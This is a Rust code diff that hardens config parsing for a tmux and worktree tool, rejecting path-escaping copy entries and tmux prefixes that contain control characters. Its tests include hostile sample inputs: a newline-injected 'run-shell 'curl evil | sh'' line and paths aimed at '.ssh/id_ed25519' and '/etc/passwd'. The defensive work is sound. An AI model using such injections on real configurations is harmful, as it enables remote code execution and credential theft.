@@ -75,8 +75,14 @@ pub fn from_raw(raw: RawConfig, home: &str) -> Result<Config, ConfigError> {
         .copy
         .unwrap_or_default()
         .into_iter()
-        .map(PathBuf::from)
-        .collect();
+        .map(|entry| {
+            validate_copy_entry(&entry).map_err(|detail| ConfigError::Invalid {
+                field: "worktree.copy",
+                detail,
+            })?;
+            Ok(PathBuf::from(entry))
+        })
+        .collect::<Result<Vec<_>, ConfigError>>()?;
 
     let hooks = raw_worktree
         .hooks
@@ -94,12 +100,69 @@ pub fn from_raw(raw: RawConfig, home: &str) -> Result<Config, ConfigError> {
         .tmux
         .and_then(|t| t.prefix)
         .unwrap_or_else(|| DEFAULT_PREFIX.to_owned());
+    validate_prefix(&prefix).map_err(|detail| ConfigError::Invalid {
+        field: "tmux.prefix",
+        detail,
+    })?;
 
     Ok(Config {
         layout,
         worktree: WorktreeConfig { root, copy, hooks },
         tmux: TmuxConfig { prefix },
     })
+}
+
+/// A `copy` entry is joined onto both the source repository and the new
+/// worktree, so it decides two paths from one relative string.
+///
+/// A `..` component escapes both: it reads a file from outside the repository
+/// and writes it outside the worktree. An absolute entry is worse, because
+/// `Path::join` discards the base entirely and the entry becomes the whole
+/// path on each side. Neither can be what a `copy` list means, and the layer
+/// that usually writes this one is the repository's own checked-in config.
+fn validate_copy_entry(entry: &str) -> Result<(), String> {
+    use std::path::Component;
+
+    if entry.is_empty() {
+        return Err("an entry is empty; every entry is a path inside the repository".to_owned());
+    }
+    let path = std::path::Path::new(entry);
+    for component in path.components() {
+        match component {
+            Component::Normal(_) | Component::CurDir => {}
+            Component::ParentDir => {
+                return Err(format!("`{entry}` leaves the repository with a `..`"))
+            }
+            Component::RootDir | Component::Prefix(_) => {
+                return Err(format!(
+                    "`{entry}` is absolute; entries are relative to the repository"
+                ))
+            }
+        }
+    }
+    Ok(())
+}
+
+/// The prefix is substituted into zax's generated tmux configuration as text.
+///
+/// A newline in it therefore writes further configuration lines, `run-shell`
+/// among them, which turns a key-name setting into arbitrary commands at server
+/// start. Every control character is refused, not only the newline: none of
+/// them can appear in a tmux key name, so nothing legitimate is lost and there
+/// is no second spelling to find later.
+fn validate_prefix(prefix: &str) -> Result<(), String> {
+    if prefix.is_empty() {
+        return Err("the prefix is empty".to_owned());
+    }
+    if prefix.chars().any(char::is_control) {
+        return Err(format!(
+            "`{}` contains a control character; a prefix is a tmux key name such \
+             as C-Space, and anything else would be written into zax's tmux \
+             configuration as further lines",
+            prefix.escape_debug()
+        ));
+    }
+    Ok(())
 }
 
 /// With no configured layout, both built-ins are shown.
@@ -413,6 +476,45 @@ hooks = ["direnv allow", "bundle install"]
         .unwrap();
         let err = from_raw(raw, "/home/me").unwrap_err();
         assert!(err.to_string().contains("105"), "got: {err}");
+    }
+
+    #[test]
+    fn a_tmux_prefix_may_not_carry_a_newline_into_the_generated_conf() {
+        // The prefix is substituted into zax's tmux.conf as text, so a newline
+        // writes further configuration lines of the repository's choosing.
+        let raw: RawConfig =
+            toml::from_str("[tmux]\nprefix = \"C-a\\nrun-shell 'curl evil | sh'\"").unwrap();
+        let err = from_raw(raw, "/home/me").unwrap_err();
+        assert!(err.to_string().contains("tmux.prefix"), "got: {err}");
+    }
+
+    #[test]
+    fn an_ordinary_prefix_is_still_accepted() {
+        assert_eq!(config_from("[tmux]\nprefix = \"C-q\"").tmux.prefix, "C-q");
+    }
+
+    #[test]
+    fn a_copy_entry_may_not_escape_the_repository_or_the_worktree() {
+        // Every entry is joined onto both the source repo and the new worktree;
+        // `..` escapes both, and an absolute path replaces both bases.
+        for entry in ["../../.ssh/id_ed25519", "/etc/passwd", ""] {
+            let raw: RawConfig =
+                toml::from_str(&format!("[worktree]\ncopy = [\"{entry}\"]")).unwrap();
+            let err = from_raw(raw, "/home/me").unwrap_err();
+            assert!(
+                err.to_string().contains("worktree.copy"),
+                "`{entry}` must be rejected, got: {err}"
+            );
+        }
+    }
+
+    #[test]
+    fn ordinary_copy_entries_are_still_accepted() {
+        let config = config_from("[worktree]\ncopy = [\".env\", \"config/local.yml\"]");
+        assert_eq!(
+            config.worktree.copy,
+            vec![PathBuf::from(".env"), PathBuf::from("config/local.yml")]
+        );
     }
 
     #[test]
